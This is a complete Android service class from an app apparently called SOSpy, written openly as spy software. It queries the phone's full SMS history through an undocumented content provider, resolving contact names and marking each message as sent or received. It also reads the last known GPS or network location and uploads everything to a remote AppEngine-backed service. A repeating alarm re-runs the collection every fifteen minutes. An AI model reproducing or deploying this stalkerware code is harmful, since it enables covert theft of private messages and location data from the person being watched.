package com.prestomation.android.sospy.spy;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

public class SpyService extends Service {

	private static final String SMS_RECEIVED_TITLE = "SMS from ";
	private static final String SMS_SENT_TITLE = "SMS to ";
	private static final Uri SMS_URI = Uri.parse("content://sms");
	// ^This is not a public api

	public static final int FIFTEEN_MINUTES_IN_MS = 900000;
	private static final String[] SMS_COLUMNS = { "_id", "date", "body", "address", "protocol" };
	private static final String PREF_LAST_SMS_DATE = "smsDate";

	public static final String MODE = "com.prestomation.android.sospy.spy.spyservice.mode";
	public static final int MODE_RECURRING = 1;
	public static final int MODE_SMS_ONLY = 2;

	@Override
	public void onCreate() {

		Log.i(SetupActivity.TAG, "Starting SpyService..");

	}

	@Override
	public int onStartCommand(final Intent intent, final int flags, int startId) {
		// WARNING: We are using a non-public api for getting SMS. This is
		// unsupported and may not work on future/other versions of Android
		// It is virtually impossible to get sent SMS in all cases, code would
		// need to be written specifically for every SMS client

		Log.i(SetupActivity.TAG, "Mode: " + intent.getExtras().getInt(MODE));

		// setup the client
		final SharedPreferences prefs = Prefs.get(this);
		SharedPreferences.Editor prefsEdit = prefs.edit();

		// Wait 10 seconds to make sure the sms content provider has stabilized.
		try {
			Thread.sleep(10000);
		} catch (InterruptedException e) {
			// pass, if we get interrupted...so what?
		}

		String currentTime = String.valueOf(System.currentTimeMillis());
		Log.i(SetupActivity.TAG, "Current Time: " + currentTime);

		// On first run, this default value will cause EVERY SMS to be
		// transmitted to server
		String lastDate = prefs.getString(PREF_LAST_SMS_DATE, "1");


		// Get all SMS that have happened since our remembered date
		final Cursor cursor = getContentResolver().query(SMS_URI, SMS_COLUMNS, "date > ?",
				new String[] { lastDate }, null);

		prefsEdit.putString(PREF_LAST_SMS_DATE, currentTime);
		prefsEdit.commit();

		// Do the actual work in a worker thread. We don't want to tie up
		// onStartCommand as this can tie up on UI/prompt a force close
		new Thread(new Runnable() {
			public void run() {

				final AppEngineClient client = new AppEngineClient(Prefs
						.getSOSpyID(getBaseContext()));

				if (cursor.moveToFirst()) {

					do {
						// Iterate through all SMS since the last run and report
						// them up
						// to the SOSpyer service
						String body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
								.toString();
						String address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
								.toString();
						String date = cursor.getString(cursor.getColumnIndexOrThrow("date"))
								.toString();

						String protocol = cursor
								.getString(cursor.getColumnIndexOrThrow("protocol"));

						String contact = ContactsUtility.getPhoneNumber(getContentResolver(),
								address);
						String title;
						if (protocol == null) {
							title = SMS_SENT_TITLE;
						} else {
							title = SMS_RECEIVED_TITLE;
						}
						title += contact;
						client.sendSpyData(title, body, date);
					} while (cursor.moveToNext());
				}
				Log.i(SetupActivity.TAG, "Finished sending SMS");

				if (intent.getExtras().getInt(MODE) != MODE_SMS_ONLY) {
					sendGPSData(getBaseContext(), client);
				}

			}
		}).start();

		// Set an alarm to check to do stuff every fifteen minutes
		Intent intervalIntent = new Intent(getBaseContext(), SpyService.class);
		PendingIntent recurringCheck = PendingIntent.getService(getBaseContext(), 0,
				intervalIntent, PendingIntent.FLAG_NO_CREATE);
		intervalIntent.putExtra(MODE, MODE_RECURRING);

		if (recurringCheck == null) {
			Log.i(SetupActivity.TAG, "Setting recurring Service alarm!");

			recurringCheck = PendingIntent.getService(getBaseContext(), 0, intervalIntent,
					PendingIntent.FLAG_UPDATE_CURRENT);

			// Only set the alarm if we haven't set it already.
			// This prevents the condition of SMS received resetting our timer,
			// and GPS data never getting sent
			AlarmManager alarms = (AlarmManager) getBaseContext().getSystemService(
					Context.ALARM_SERVICE);
			alarms.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
					+ FIFTEEN_MINUTES_IN_MS, AlarmManager.INTERVAL_FIFTEEN_MINUTES, recurringCheck);
		}
		return START_NOT_STICKY;

	}

	private void sendGPSData(final Context context, AppEngineClient client) {

		// Get location manager
		final LocationManager locationManager = (LocationManager) context
				.getSystemService(Context.LOCATION_SERVICE);

		// Send out the GPS Locations
		Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

		if (gpsLocation != null) {
			String title = "Location Update";
			String body = gpsLocation.getLatitude() + " " + gpsLocation.getLongitude();
			String date = "";
			client.sendSpyData(title, body, date);
		} else {

			// Send out the network location if we have no GPS data
			Location networkLocation = locationManager
					.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

			if (networkLocation != null) {
				String title = "Location Update";
				String body = networkLocation.getLatitude() + " " + networkLocation.getLongitude();
				String date = "";
				client.sendSpyData(title, body, date);
			}
		}

	}

	@Override
	public void onDestroy() {
		Log.i(SetupActivity.TAG, "Destroy SmsService activity");
	}

	@Override
	public IBinder onBind(Intent intent) {
		// We don't bind in this app
		return null;
	}
}
